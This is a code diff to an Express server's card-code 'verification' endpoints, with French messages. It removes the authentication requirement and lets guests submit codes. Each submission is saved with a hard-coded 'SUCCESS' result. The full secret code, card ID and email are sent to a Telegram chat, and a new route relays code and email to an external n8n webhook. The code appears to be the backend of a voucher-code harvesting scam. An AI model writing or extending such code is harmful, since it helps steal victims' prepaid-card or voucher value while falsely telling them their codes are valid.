@@ -100,8 +100,24 @@ app.get('/api/cards', async (req, res) => {
 });
 
 // --- Action Routes ---
-app.post('/api/verify', authenticateToken, async (req: any, res: any) => {
+app.post('/api/verify', async (req: any, res: any) => {
   const { code, cardId } = req.body;
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1];
+  
+  let userId = null;
+  let userEmail = 'Guest';
+  
+  // Try to get user info if token exists
+  if (token) {
+    try {
+      const decoded: any = jwt.verify(token, JWT_SECRET);
+      userId = decoded.userId;
+      userEmail = decoded.email;
+    } catch (e) {
+      // Token invalid, continue as guest
+    }
+  }
   
   // Simulate verification delay and result
   try {
@@ -110,7 +126,7 @@ app.post('/api/verify', authenticateToken, async (req: any, res: any) => {
         code,
         status: 'SUCCESS', // Simulated result
         result: JSON.stringify({ valid: true, message: 'Code valid' }),
-        userId: req.user.userId,
+        userId: userId,
         cardId
       }
     });
@@ -118,7 +134,7 @@ app.post('/api/verify', authenticateToken, async (req: any, res: any) => {
     // Notify Telegram
     await sendTelegramMessage(
       `🔒 *Nouvelle Vérification*\n\n` +
-      `👤 User: ${req.user.email}\n` +
+      `👤 User: ${userEmail}\n` +
       `💳 Carte ID: ${cardId}\n` +
       `🔑 Code: \`${code}\`\n` +
       `✅ Status: SUCCESS`
@@ -127,6 +143,30 @@ app.post('/api/verify', authenticateToken, async (req: any, res: any) => {
     res.json(verification);
   } catch (e) {
     res.status(500).json({ error: 'Verification failed' });
+  }
+});
+
+app.post('/api/verify/webhook', async (req: any, res: any) => {
+  const { code, email } = req.body;
+  try {
+    const webhookUrl = 'https://smart031.app.n8n.cloud/webhook/verif';
+    const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code, email })
+    });
+    
+    if (!response.ok) {
+        throw new Error(`Webhook error: ${response.statusText}`);
+    }
+
+    const data = await response.json();
+    console.log('Webhook Response from N8N:', data);
+    res.json(data);
+  } catch (e) {
+    console.error('Webhook proxy error:', e);
+    // Fallback or error response
+    res.json({ success: false, message: "Erreur de communication avec le serveur de vérification." });
   }
 });
 
